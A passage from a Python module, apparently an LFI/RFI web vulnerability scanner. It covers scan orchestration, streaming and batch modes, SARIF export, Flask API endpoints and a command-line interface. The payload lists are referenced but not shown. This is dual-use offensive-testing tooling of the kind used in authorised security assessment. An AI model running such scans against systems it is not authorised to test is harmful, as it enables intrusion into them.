    """Scan `target` for LFI/RFI vulnerabilities. Never raises."""
    if not _HAS_REQUESTS:
        return {
            "tool": "lfi_rfi", "version": __version__,
            "target": target, "data": {},
            "error": "The 'requests' library is required. Install with "
                     "`pip install requests`.",
        }
    cfg = LFIConfig(
        mode=str(mode or "basic").lower(),
        timeout=float(kwargs.get("timeout", DEFAULT_TIMEOUT)),
        concurrency=int(kwargs.get("concurrency", DEFAULT_CONCURRENCY)),
        rate_limit=float(kwargs.get("rate_limit", DEFAULT_RATE_LIMIT)),
        max_bytes=int(kwargs.get("max_bytes", DEFAULT_MAX_BYTES)),
        max_duration=float(kwargs.get("max_duration", DEFAULT_MAX_DURATION)),
        verify_ssl=bool(kwargs.get("verify_ssl", False)),
        follow_redirects=bool(kwargs.get("follow_redirects", True)),
        headers=kwargs.get("headers"),
        cookies=kwargs.get("cookies"),
        proxies=kwargs.get("proxies"),
        params=kwargs.get("params"),
        callback_url=kwargs.get("callback_url"),
        test_rfi=bool(kwargs.get("test_rfi", True)),
    )
    try:
        return LFIRFIScanner(cfg).scan(target)
    except Exception as exc:
        logger.error("[lfi_rfi] scan crashed: %s", exc, exc_info=True)
        return {
            "tool": "lfi_rfi", "version": __version__,
            "target": target, "data": {},
            "error": str(exc),
        }


lfi_rfi       = run
lfi_scan      = run
rfi_scan      = run
lfi           = run
rfi           = run
lfi_rfi_check = run
scan_lfi      = run
scan_rfi      = run


def run_streaming(
    target: str,
    options: Optional[Dict[str, Any]] = None,
    cancel_event: Optional[Any] = None,
) -> Iterator[Dict[str, Any]]:
    options = options or {}
    started = time.time()
    yield {"type": "start", "target": target, "options": options}
    yield {"type": "stage", "stage": "discovering_params"}

    scanner = None
    try:
        url = _normalize_url(target)
        if not url:
            yield {"type": "error", "message": "Empty target"}
            return
        cfg = LFIConfig(
            mode=str(options.get("mode", "basic")).lower(),
            timeout=float(options.get("timeout", DEFAULT_TIMEOUT)),
            concurrency=int(options.get("concurrency", DEFAULT_CONCURRENCY)),
            rate_limit=float(options.get("rate_limit", DEFAULT_RATE_LIMIT)),
            verify_ssl=bool(options.get("verify_ssl", False)),
            params=options.get("params"),
            callback_url=options.get("callback_url"),
            test_rfi=bool(options.get("test_rfi", True)),
        )
        scanner = LFIRFIScanner(cfg)
        if cancel_event is not None and hasattr(cancel_event, "is_set"):
            def _watch():
                try:
                    while not cancel_event.is_set():
                        time.sleep(0.25)
                    scanner.cancel()
                except Exception:
                    pass
            threading.Thread(target=_watch, daemon=True).start()

        yield {"type": "stage", "stage": "baseline"}
        result = scanner.scan(target)
        yield {"type": "stage", "stage": "reporting"}
        yield {"type": "result", "data": result}
        yield {
            "type": "summary",
            "duration_ms": int((time.time() - started) * 1000),
            "ok": result.get("error") is None,
        }
        yield {"type": "stage", "stage": "done"}
    except Exception as exc:
        logger.error("[lfi_rfi] streaming failed: %s", exc, exc_info=True)
        yield {"type": "error", "message": str(exc)}


def scan_many(
    targets: Iterable[str],
    mode: str = "basic",
    workers: int = 4,
    on_result: Optional[Callable[[str, Dict[str, Any]], None]] = None,
    **kwargs,
) -> List[Dict[str, Any]]:
    targets = list(targets)
    results: List[Optional[Dict[str, Any]]] = [None] * len(targets)

    def _one(idx: int, tgt: str):
        r = run(tgt, mode=mode, **kwargs)
        if on_result:
            try:
                on_result(tgt, r)
            except Exception:
                pass
        return idx, r

    if workers <= 1 or len(targets) <= 1:
        for i, t in enumerate(targets):
            _, r = _one(i, t)
            results[i] = r
        return [r for r in results if r is not None]

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_one, i, t): i for i, t in enumerate(targets)}
        for fut in as_completed(futures):
            try:
                idx, r = fut.result()
                results[idx] = r
            except Exception as exc:
                logger.warning("[lfi_rfi] batch worker failed: %s", exc)
    return [r for r in results if r is not None]


# ═══════════════════════════════════════════════════════════════════════════
# SELF-CHECK
# ═══════════════════════════════════════════════════════════════════════════
def self_check() -> Dict[str, Any]:
    return {
        "module":       "modules.lfi_rfi",
        "version":      __version__,
        "author":       __author__,
        "credit":       __credit__,
        "requests":     _HAS_REQUESTS,
        "flask":        _HAS_FLASK,
        "logger":       logger.name,
        "colour":       _USE_COLOR,
        "linux_files":  len(_LINUX_FILES),
        "windows_files": len(_WINDOWS_FILES),
        "php_wrappers": len(_PHP_WRAPPER_PAYLOADS),
        "traversal_styles": list(_TRAVERSAL_STYLES.keys()),
        "rfi_variants": len(_RFI_PAYLOADS),
        "aliases":      ["run", "lfi_rfi", "lfi_scan", "rfi_scan",
                         "lfi", "rfi", "lfi_rfi_check",
                         "scan_lfi", "scan_rfi"],
        "endpoint":     "/api/lfi_rfi/scan" if _HAS_FLASK else None,
        "ready":        _HAS_REQUESTS,
    }


def list_payloads(mode: str = "basic") -> Dict[str, Any]:
    lfi = _build_lfi_payloads(mode)
    rfi = _build_rfi_payloads(mode)
    by_tech: Dict[str, int] = {}
    for p in lfi + rfi:
        by_tech[p["technique"]] = by_tech.get(p["technique"], 0) + 1
    return {
        "mode":          mode,
        "total":         len(lfi) + len(rfi),
        "lfi_count":     len(lfi),
        "rfi_count":     len(rfi),
        "by_technique":  by_tech,
        "lfi_payloads":  lfi,
        "rfi_payloads":  rfi,
    }


# ═══════════════════════════════════════════════════════════════════════════
# SARIF EXPORT
# ═══════════════════════════════════════════════════════════════════════════
def to_sarif(result: Dict[str, Any]) -> Dict[str, Any]:
    data = (result or {}).get("data", {}) or {}
    findings = data.get("findings", []) or []
    results = []
    for f in findings:
        level = {"critical": "error", "high": "error",
                 "medium": "warning", "low": "note"}.get(
                    f.get("severity", "medium"), "warning")
        tech = f.get("technique", "unknown")
        param = f.get("parameter", "?")
        label = f.get("label", "")
        conf = f.get("confidence", 0)
        msg = (f"{tech} via parameter '{param}' — {label} "
               f"(confidence {conf}%)")
        results.append({
            "ruleId":  f"lfi-rfi/{tech}",
            "level":   level,
            "message": {"text": msg},
            "locations": [{
                "physicalLocation": {
                    "artifactLocation": {
                        "uri": result.get("target", ""),
                    },
                },
            }],
        })
    return {
        "$schema": ("https://raw.githubusercontent.com/oasis-tcs/"
                    "sarif-spec/master/Schemata/sarif-schema-2.1.0.json"),
        "version": "2.1.0",
        "runs": [{
            "tool": {"driver": {
                "name": "Opencode LFI/RFI Scanner",
                "version": __version__,
                "informationUri": "https://owasp.org/www-project-web-security-testing-guide/",
                "rules": [{
                    "id": "lfi-rfi/path_traversal",
                    "name": "Local File Inclusion",
                    "shortDescription": {"text": "Local File Inclusion"},
                }, {
                    "id": "lfi-rfi/php_wrapper",
                    "name": "PHP Wrapper Exploitation",
                    "shortDescription": {"text": "PHP wrapper abuse"},
                }, {
                    "id": "lfi-rfi/remote_inclusion",
                    "name": "Remote File Inclusion",
                    "shortDescription": {"text": "Remote File Inclusion"},
                }],
            }},
            "results": results,
        }],
    }


# ═══════════════════════════════════════════════════════════════════════════
# FLASK BLUEPRINT
# ═══════════════════════════════════════════════════════════════════════════
if _HAS_FLASK:
    lfi_rfi_bp = Blueprint("lfi_rfi", __name__)

    def _bool_from(payload, args, key, default):
        v = payload.get(key, args.get(key))
        if v is None:
            return default
        return str(v).lower() not in ("0", "false", "no", "off", "")

    @lfi_rfi_bp.route("/api/lfi_rfi/scan", methods=["POST", "GET"])
    def _lfi_rfi_scan_endpoint():
        payload = flask_request.get_json(silent=True) or {}
        target = (payload.get("target")
                  or flask_request.args.get("target", "")).strip()
        mode = (payload.get("mode")
                or flask_request.args.get("mode", "basic")).lower()
        if mode not in ("basic", "expert"):
            mode = "basic"

        if not target:
            return jsonify({
                "tool": "lfi_rfi", "version": __version__,
                "target": "", "data": {},
                "error": "missing 'target' parameter",
            }), 400

        def _num(key, default, cast=float):
            try:
                v = payload.get(key, flask_request.args.get(key))
                return cast(v) if v not in (None, "") else default
            except (TypeError, ValueError):
                return default

        result = run(
            target, mode=mode,
            timeout=_num("timeout", DEFAULT_TIMEOUT, float),
            concurrency=_num("concurrency", DEFAULT_CONCURRENCY, int),
            rate_limit=_num("rate_limit", DEFAULT_RATE_LIMIT, float),
            verify_ssl=_bool_from(payload, flask_request.args,
                                  "verify_ssl", False),
            follow_redirects=_bool_from(payload, flask_request.args,
                                        "follow_redirects", True),
            test_rfi=_bool_from(payload, flask_request.args, "test_rfi", True),
            params=payload.get("params"),
            callback_url=(payload.get("callback_url")
                          or flask_request.args.get("callback_url")),
            headers=payload.get("headers"),
            cookies=payload.get("cookies"),
            proxies=payload.get("proxies"),
        )
        return jsonify(result)

    @lfi_rfi_bp.route("/api/lfi_rfi/scan/stream")
    def _lfi_rfi_stream_endpoint():
        target = (flask_request.args.get("target") or "").strip()
        if not target:
            return jsonify({"error": "target_required"}), 400
        cancel_event = threading.Event()
        options = {
            "mode":        flask_request.args.get("mode", "basic"),
            "timeout":     float(flask_request.args.get("timeout", DEFAULT_TIMEOUT)),
            "concurrency": int(flask_request.args.get("concurrency", DEFAULT_CONCURRENCY)),
            "rate_limit":  float(flask_request.args.get("rate_limit", DEFAULT_RATE_LIMIT)),
            "test_rfi":    flask_request.args.get("test_rfi", "1") == "1",
            "callback_url": flask_request.args.get("callback_url"),
        }

        def _gen():
            try:
                for ev in run_streaming(target, options, cancel_event):
                    yield f"data: {_json.dumps(ev, ensure_ascii=False, default=str)}\n\n"
            except GeneratorExit:
                cancel_event.set()
            except Exception as exc:
                yield f"data: {_json.dumps({'type': 'error', 'message': str(exc)})}\n\n"

        return Response(
            _gen(),
            headers={
                "Content-Type": "text/event-stream",
                "Cache-Control": "no-cache, no-transform",
                "X-Accel-Buffering": "no",
                "Connection": "keep-alive",
            },
        )

    @lfi_rfi_bp.route("/api/lfi_rfi/payloads", methods=["GET"])
    def _lfi_rfi_payloads_endpoint():
        mode = (flask_request.args.get("mode") or "basic").lower()
        if mode not in ("basic", "expert"):
            mode = "basic"
        return jsonify(list_payloads(mode))

    @lfi_rfi_bp.route("/api/lfi_rfi/status")
    def _lfi_rfi_status_endpoint():
        return jsonify(self_check())

    def register_blueprint(app) -> None:
        app.register_blueprint(lfi_rfi_bp)
        logger.info("lfi_rfi blueprint registered at /api/lfi_rfi/scan")


# ═══════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════
def _hr(width: int = 66) -> str:
    return _c("─" * width, _Ansi.BLUE_DEEP)


def _box_top(title: str, width: int = 68) -> str:
    t = f"─ {title} "
    return _c("╭" + t + "─" * max(0, width - len(t) - 2) + "╮", _Ansi.BLUE_DEEP)


def _box_line(text: str, width: int = 68) -> str:
    body = ("  " + text)[: width - 2].ljust(width - 2)
    return _c("│" + body + "│", _Ansi.BLUE_DEEP)


def _box_bot(width: int = 68) -> str:
    return _c("╰" + "─" * (width - 2) + "╯", _Ansi.BLUE_DEEP)


def _sev_color(sev: str) -> str:
    return {
        "critical": _Ansi.RED,
        "high":     _Ansi.RED,
        "medium":   _Ansi.ORANGE,
        "low":      _Ansi.YELLOW,
        "info":     _Ansi.GRAY,
    }.get(sev, _Ansi.GRAY)


def _print_result(result: Dict[str, Any]) -> None:
    """
    Human-readable CLI renderer.

    v1.0.2 — Every coloured fragment is precomputed OUTSIDE the f-strings.
    Python's f-string parser rejects a format spec applied to a function
    call nested inside another f-string (e.g. `{_c(x():<10s, ...)}`).
    """
    if result.get("error"):
        print(f"  {_c('✗', _Ansi.RED)} {result['target']}: {result['error']}")
        return

    d = result.get("data") or {}
    print()
    print(_box_top(f"lfi/rfi scan  ·  {result.get('target')}"))
    print(_box_line(f"mode         : {d.get('mode', '?')}"))
    print(_box_line(f"params       : {', '.join(d.get('params_tested', [])) or '--'}"))
    print(_box_line(f"payloads     : {d.get('payloads_used', 0)}"))
    print(_box_line(f"requests     : {d.get('requests_sent', 0)}"))
    print(_box_line(f"duration     : {d.get('duration', 0):.2f}s"))

    findings = d.get("findings", []) or []
    if findings:
        badge = _c(f"{len(findings)} finding(s)", _Ansi.BOLD + _Ansi.RED)
    else:
        badge = _c("clean", _Ansi.BOLD + _Ansi.GREEN)
    print(_box_line(f"result       : {badge}"))
    print(_box_bot())

    if not findings:
        print(f"  {_c('✓', _Ansi.GREEN)} No LFI/RFI indicators triggered.\n")
        return

    print()
    for finding in findings:
        sev  = str(finding.get("severity", "medium"))
        conf = int(finding.get("confidence", 0))
        col  = _sev_color(sev)

        # Every fragment is precomputed outside any f-string.
        sev_tag       = f"[{sev.upper():8s}]"
        sev_colored   = _c(sev_tag, col)

        conf_str      = f"{conf:3d}%"
        conf_colored  = _c(conf_str, _Ansi.WHITE)

        param_raw     = str(finding.get("parameter", "?"))
        param_pad     = f"{param_raw:<10s}"
        param_colored = _c(param_pad, _Ansi.WHITE)

        technique     = str(finding.get("technique", "?"))
        tech_colored  = _c(technique, _Ansi.BLUE_HI)

        label         = str(finding.get("label", ""))[:48]
        label_colored = _c(label, _Ansi.GRAY)

        print(
            f"  {sev_colored} {conf_colored}  "
            f"{param_colored} {tech_colored}  {label_colored}"
        )

        excerpt_lines = (finding.get("excerpt") or "").strip().splitlines()
        if excerpt_lines:
            first = excerpt_lines[0][:110]
            print(f"            {_c(first, _Ansi.GRAY_DIM)}")
    print()


def _main() -> int:
    ap = argparse.ArgumentParser(
        description=f"LFI/RFI Scanner v{__version__}",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    ap.add_argument("targets", nargs="*", help="Target URLs")
    ap.add_argument("--mode", choices=["basic", "expert"], default="basic")
    ap.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    ap.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY)
    ap.add_argument("--rate-limit", type=float, default=DEFAULT_RATE_LIMIT)
    ap.add_argument("--max-duration", type=float, default=DEFAULT_MAX_DURATION)
    ap.add_argument("--params", nargs="*", help="Explicit parameters to test")
    ap.add_argument("--callback-url", default=None, help="RFI OOB callback URL")
    ap.add_argument("--no-rfi", action="store_true", help="Skip RFI tests")
    ap.add_argument("--verify-ssl", action="store_true")
    ap.add_argument("--json", action="store_true", help="Raw JSON output")
    ap.add_argument("--sarif", action="store_true",
                    help="Emit SARIF (single target)")
    ap.add_argument("--self-check", action="store_true",
                    help="Print runtime diagnostics and exit")
    ap.add_argument("--list-payloads", action="store_true",
                    help="Print every payload for the chosen mode and exit")
    ap.add_argument("--version", action="version", version=__version__)
    args = ap.parse_args()

    if args.self_check:
        print(_json.dumps(self_check(), indent=2))
        return 0

    if args.list_payloads:
        print(_json.dumps(list_payloads(args.mode), indent=2))
        return 0

    if not args.targets:
        ap.print_help()
        return 0

    results = scan_many(
        args.targets, mode=args.mode, workers=min(4, args.concurrency),
        timeout=args.timeout,
        concurrency=args.concurrency,
        rate_limit=args.rate_limit,
        max_duration=args.max_duration,
        verify_ssl=args.verify_ssl,
        params=args.params,
        callback_url=args.callback_url,
        test_rfi=not args.no_rfi,
    )

    if args.json:
        print(_json.dumps(results, indent=2, default=str))
        return 0
    if args.sarif and results:
        print(_json.dumps(to_sarif(results[0]), indent=2, default=str))
        return 0

    for r in results:
        _print_result(r)
    return 0


if __name__ == "__main__":
    sys.exit(_main())